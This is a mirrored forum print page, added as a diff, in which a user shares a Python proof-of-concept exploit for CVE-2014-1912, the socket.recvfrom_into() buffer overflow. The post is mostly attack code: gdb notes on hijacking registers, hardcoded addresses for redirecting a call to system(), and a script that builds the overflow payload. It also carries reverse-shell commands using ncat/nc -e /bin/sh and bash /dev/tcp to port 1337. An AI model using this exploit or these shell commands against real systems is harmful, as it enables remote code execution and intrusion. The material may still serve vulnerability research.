@@ -1,0 +1,167 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=5842&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:27:02 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<base  /><!--[if IE]></base><![endif]-->
+	<meta name="generator" content="vBulletin 4.2.1" />
+
+	
+	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	
+
+
+
+	<title> python socket.recvfrom_into() remote buffer overflow</title>
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body>
+
+<div class="above_body">
+<div id="header" class="floatcontainer">
+<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+</div>
+</div>
+<div class="body_wrapper">
+<div id="pagetitle">
+	<h1><a href="showthreadf8c4.html?t=5842">python socket.recvfrom_into() remote buffer overflow</a></h1>
+	<p class="description">Printable View</p>
+</div>
+
+
+
+<ul id="postlist">
+	<li class="postbit blockbody" id="post_1">
+	<div class="header">
+		<div class="datetime">02-25-2014, 04:51 PM</div>
+		<span class="username">prashant_uniyal</span>
+	</div>
+	
+	
+		<div class="title">python socket.recvfrom_into() remote buffer overflow</div>
+	
+	<div class="content">
+		<blockquote class="restore">Sharing : python socket.recvfrom_into() remote buffer overflow<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">#!/usr/bin/env python<br />
+<br />
+'''<br />
+# Exploit Title: python socket.recvfrom_into() remote buffer overflow<br />
+# Date: 21/02/2014<br />
+# Exploit Author: @sha0coder<br />
+# Vendor Homepage: python.org<br />
+# Version: python2.7 and python3<br />
+# Tested on: linux 32bit + python2.7<br />
+# CVE : CVE-2014-1912<br />
+<br />
+<br />
+<br />
+socket.recvfrom_into() remote buffer overflow Proof of concept<br />
+by @sha0coder<br />
+<br />
+With NX evasion!<br />
+<br />
+<br />
+(gdb) x/i $eip<br />
+=&gt; 0x817bb28:&nbsp; &nbsp; &nbsp; &nbsp; mov&nbsp; &nbsp; eax,DWORD PTR [ebx+0x4]&nbsp; &nbsp; &nbsp;  &lt;--- ebx full control =&gt; eax full conrol<br />
+&nbsp;  0x817bb2b:&nbsp; &nbsp; &nbsp; &nbsp; test&nbsp;  BYTE PTR [eax+0x55],0x40<br />
+&nbsp;  0x817bb2f:&nbsp; &nbsp; &nbsp; &nbsp; jne&nbsp; &nbsp; 0x817bb38 --&gt;<br />
+&nbsp;  ...<br />
+&nbsp;  0x817bb38:&nbsp; &nbsp; &nbsp; &nbsp; mov&nbsp; &nbsp; eax,DWORD PTR [eax+0xa4]&nbsp; &nbsp; &nbsp; &lt;--- eax full control again<br />
+&nbsp;  0x817bb3e:&nbsp; &nbsp; &nbsp; &nbsp; test&nbsp;  eax,eax<br />
+&nbsp;  0x817bb40:&nbsp; &nbsp; &nbsp; &nbsp; jne&nbsp; &nbsp; 0x817bb58 --&gt;<br />
+&nbsp;  ...<br />
+&nbsp;  0x817bb58:&nbsp; &nbsp; &nbsp; &nbsp; mov&nbsp; &nbsp; DWORD PTR [esp],ebx&nbsp; &lt;---- ebx points to the beginning of the buffer&nbsp;  [trash]||shell cmd[null byte]<br />
+&nbsp;  0x817bb5b:&nbsp; &nbsp; &nbsp; &nbsp; call&nbsp;  eax &lt;--------------------- indirect fucktion call ;) will be redirected to system()<br />
+<br />
+'''<br />
+<br />
+import struct<br />
+<br />
+def off(o):<br />
+&nbsp; &nbsp; &nbsp; &nbsp; return struct.pack('L',o)<br />
+<br />
+<br />
+'''<br />
+rop = {<br />
+&nbsp; &nbsp; &nbsp; &nbsp; 'pop eax': off(0x80795ac),<br />
+&nbsp; &nbsp; &nbsp; &nbsp; 'call eax': off(0x817bb5b),<br />
+&nbsp; &nbsp; &nbsp; &nbsp; 'xor eax': off(0x8061379),<br />
+&nbsp; &nbsp; &nbsp; &nbsp; 'mov [eax], edx': off(0x8078cf6),<br />
+&nbsp; &nbsp; &nbsp; &nbsp; 'xor edx, edx': off(0x80a60d1),<br />
+}<br />
+'''<br />
+<br />
+plt = {<br />
+&nbsp; &nbsp; &nbsp; &nbsp; 'system': off(0x805b7e0),<br />
+}<br />
+<br />
+<br />
+<br />
+<br />
+#addr2null = off(0x11111111)<br />
+<br />
+<br />
+ebx = 0xb7ae7908&nbsp; # points to the begining of the buff <br />
+eax = ebx<br />
+eax2 = ebx+20<br />
+padd2 = 'X'*(144)<br />
+padd1 = 'Y'*(8)&nbsp; <br />
+<br />
+#system_command = 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1'<br />
+#system_command = 'nc -e /bin/sh 127.0.0.1 1337'<br />
+system_command = 'ncat -e /bin/sh 127.0.0.1 1337'<br />
+<br />
+'''&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  <br />
+&nbsp; &nbsp; &nbsp; &nbsp; +------------+------------------+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; +--------------------+<br />
+&nbsp; &nbsp; &nbsp; &nbsp; |&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |<br />
+&nbsp; &nbsp; &nbsp; &nbsp; V&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; V&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+'''<br />
+buff = 'aaaa' + off(eax) + padd1 + off(ebx) + padd2 +&nbsp; plt['system'] + '||'+system_command+'\x00' # thanks python strings ;)<br />
+<br />
+<br />
+print 'buff sz: %s' % len(buff)<br />
+open('egg','w').write(buff)<br />
+print 'egg file generated!!!'</code><hr />
+</div>Source: <a href="../external.html?link=http://pastebin.com/raw.php?i=GHXSmNEg" target="_blank">http://pastebin.com/raw.php?i=GHXSmNEg</a></blockquote>
+	</div>
+</li>
+</ul>
+
+
+</div>
+<div class="below_body">
+<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:50 PM</span>.</div>
+
+<div id="footer_copyright" class="footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+</div>
+ 
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=5842&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:27:02 GMT -->
+</html>
